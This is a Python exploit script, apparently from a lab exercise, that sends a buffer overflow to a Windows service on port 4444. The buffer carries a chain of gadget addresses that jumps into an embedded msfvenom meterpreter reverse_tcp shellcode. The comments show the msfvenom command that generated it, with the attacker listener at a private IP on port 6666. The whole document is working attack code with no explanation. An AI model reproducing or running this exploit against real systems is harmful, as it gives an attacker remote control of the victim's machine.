import socket
import struct
# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LPORT=6666 LHOST=172.16.23.132 -e x86/alpha_mixed BufferRegister=EAX -f python
# windows/meterpreter/reverse_tcp - 628 bytes (stage 1)
# http://www.metasploit.com
# Encoder: x86/alpha_mixed
# VERBOSE=false, LHOST=192.168.162.128, LPORT=6666, 
# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
# StagerRetryCount=10, StagerRetryWait=5, 
# PayloadUUIDTracking=false, EnableStageEncoding=false, 
# StageEncoderSaveRegisters=, StageEncodingFallback=true, 
# PrependMigrate=false, EXITFUNC=process, AutoLoadStdapi=true, 
# AutoVerifySession=true, AutoVerifySessionTimeout=30, 
# InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
# EnableUnicodeEncoding=false, SessionRetryTotal=3600, 
# SessionRetryWait=10, SessionExpirationTimeout=604800, 
# SessionCommunicationTimeout=300, PayloadProcessCommandLine=
msf_payload =  ""
msf_payload += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
msf_payload += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
msf_payload += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
msf_payload += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
msf_payload += "\x39\x6c\x68\x68\x6b\x32\x35\x50\x73\x30\x67\x70\x61"
msf_payload += "\x70\x6c\x49\x4a\x45\x56\x51\x6f\x30\x32\x44\x4e\x6b"
msf_payload += "\x56\x30\x44\x70\x4e\x6b\x42\x72\x44\x4c\x6e\x6b\x50"
msf_payload += "\x52\x42\x34\x6c\x4b\x34\x32\x35\x78\x36\x6f\x6d\x67"
msf_payload += "\x33\x7a\x67\x56\x64\x71\x59\x6f\x6e\x4c\x37\x4c\x63"
msf_payload += "\x51\x31\x6c\x76\x62\x46\x4c\x35\x70\x4b\x71\x4a\x6f"
msf_payload += "\x64\x4d\x43\x31\x59\x57\x58\x62\x4c\x32\x56\x32\x72"
msf_payload += "\x77\x6c\x4b\x56\x32\x66\x70\x6c\x4b\x30\x4a\x77\x4c"
msf_payload += "\x4e\x6b\x62\x6c\x72\x31\x74\x38\x7a\x43\x43\x78\x45"
msf_payload += "\x51\x48\x51\x33\x61\x6e\x6b\x50\x59\x77\x50\x57\x71"
msf_payload += "\x79\x43\x6c\x4b\x72\x69\x47\x68\x78\x63\x36\x5a\x63"
msf_payload += "\x79\x4c\x4b\x70\x34\x4c\x4b\x76\x61\x6b\x66\x50\x31"
msf_payload += "\x39\x6f\x6c\x6c\x59\x51\x6a\x6f\x44\x4d\x43\x31\x79"
msf_payload += "\x57\x70\x38\x4b\x50\x50\x75\x49\x66\x65\x53\x31\x6d"
msf_payload += "\x59\x68\x55\x6b\x43\x4d\x77\x54\x52\x55\x68\x64\x52"
msf_payload += "\x78\x6c\x4b\x50\x58\x57\x54\x76\x61\x78\x53\x63\x56"
msf_payload += "\x4e\x6b\x64\x4c\x42\x6b\x6c\x4b\x36\x38\x57\x6c\x37"
msf_payload += "\x71\x68\x53\x4e\x6b\x65\x54\x4c\x4b\x57\x71\x4e\x30"
msf_payload += "\x6e\x69\x71\x54\x55\x74\x54\x64\x51\x4b\x53\x6b\x30"
msf_payload += "\x61\x43\x69\x70\x5a\x46\x31\x6b\x4f\x59\x70\x53\x6f"
msf_payload += "\x63\x6f\x43\x6a\x4e\x6b\x56\x72\x68\x6b\x4e\x6d\x33"
msf_payload += "\x6d\x35\x38\x47\x43\x76\x52\x35\x50\x75\x50\x30\x68"
msf_payload += "\x42\x57\x52\x53\x64\x72\x61\x4f\x31\x44\x71\x78\x72"
msf_payload += "\x6c\x63\x47\x77\x56\x55\x57\x6b\x39\x39\x78\x4b\x4f"
msf_payload += "\x68\x50\x4d\x68\x6c\x50\x73\x31\x55\x50\x65\x50\x36"
msf_payload += "\x49\x38\x44\x76\x34\x66\x30\x65\x38\x64\x69\x6f\x70"
msf_payload += "\x72\x4b\x75\x50\x4b\x4f\x4e\x35\x31\x7a\x35\x5a\x72"
msf_payload += "\x48\x6e\x4c\x36\x70\x46\x77\x6d\x54\x62\x48\x46\x62"
msf_payload += "\x57\x70\x36\x7a\x55\x5a\x4e\x69\x6b\x56\x50\x50\x32"
msf_payload += "\x70\x52\x70\x66\x30\x37\x30\x30\x50\x71\x50\x76\x30"
msf_payload += "\x32\x48\x49\x7a\x46\x6f\x79\x4f\x39\x70\x39\x6f\x79"
msf_payload += "\x45\x4e\x77\x72\x4a\x46\x70\x76\x36\x33\x67\x72\x48"
msf_payload += "\x6f\x69\x69\x35\x74\x34\x45\x31\x49\x6f\x48\x55\x4f"
msf_payload += "\x75\x59\x50\x71\x64\x36\x6a\x49\x6f\x62\x6e\x65\x58"
msf_payload += "\x33\x45\x6a\x4c\x58\x68\x52\x47\x53\x30\x45\x50\x63"
msf_payload += "\x30\x70\x6a\x33\x30\x32\x4a\x77\x74\x63\x66\x36\x37"
msf_payload += "\x43\x58\x57\x72\x4b\x69\x69\x58\x43\x6f\x69\x6f\x59"
msf_payload += "\x45\x6c\x43\x68\x78\x63\x30\x51\x6e\x35\x66\x4c\x4b"
msf_payload += "\x64\x76\x61\x7a\x57\x30\x42\x48\x35\x50\x72\x30\x77"
msf_payload += "\x70\x43\x30\x52\x76\x72\x4a\x47\x70\x35\x38\x30\x58"
msf_payload += "\x79\x34\x62\x73\x78\x65\x6b\x4f\x49\x45\x6c\x53\x66"
msf_payload += "\x33\x71\x7a\x73\x30\x56\x36\x61\x43\x30\x57\x45\x38"
msf_payload += "\x46\x62\x48\x59\x38\x48\x61\x4f\x69\x6f\x7a\x75\x4e"
msf_payload += "\x63\x49\x68\x33\x30\x63\x4d\x71\x38\x61\x48\x61\x78"
msf_payload += "\x43\x30\x73\x70\x45\x50\x75\x50\x70\x6a\x57\x70\x46"
msf_payload += "\x30\x62\x48\x46\x6b\x66\x4f\x66\x6f\x64\x70\x6b\x4f"
msf_payload += "\x49\x45\x50\x57\x52\x48\x73\x45\x30\x6e\x50\x4d\x35"
msf_payload += "\x31\x39\x6f\x38\x55\x33\x6e\x51\x4e\x39\x6f\x46\x6c"
msf_payload += "\x55\x74\x64\x4f\x4c\x45\x30\x70\x49\x6f\x79\x6f\x39"
msf_payload += "\x6f\x4a\x49\x4d\x4b\x59\x6f\x69\x6f\x69\x6f\x47\x71"
msf_payload += "\x6b\x73\x35\x79\x7a\x66\x52\x55\x6b\x71\x4a\x63\x4d"
msf_payload += "\x6b\x4c\x30\x4d\x65\x4e\x42\x50\x56\x42\x4a\x57\x70"
msf_payload += "\x70\x53\x49\x6f\x79\x45\x41\x41"

host = "127.0.0.1"
#host = "172.16.23.134"
port = 4444

csock = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
csock.connect ( (host, int(port)) )

payload_len = 977
buf =  "A"*8
buf += struct.pack("I", 0x1047621f) # MOV EAX,EDI # POP EDI # POP ESI # POP EBP # RETN
buf += "A"*12
buf += struct.pack("I", 0x1048940f) # ADD EAX,20 # POP EBP # RETN
buf += "A"*4
buf += struct.pack("I", 0x10473e0b) # ADD EAX,8 # RETN 
buf += struct.pack("I", 0x10471f49) # JMP EAX

buf += msf_payload 
buf += "\xcc"* (payload_len - len(msf_payload))
buf += struct.pack("I", 0x10489dbd) # ADD ESP,10 # XOR EAX,EAX # POP EBX # POP EDI # POP ESI # POP EBP # RETN 
buf += "A"*3

csock.send(buf)
csock.close()
	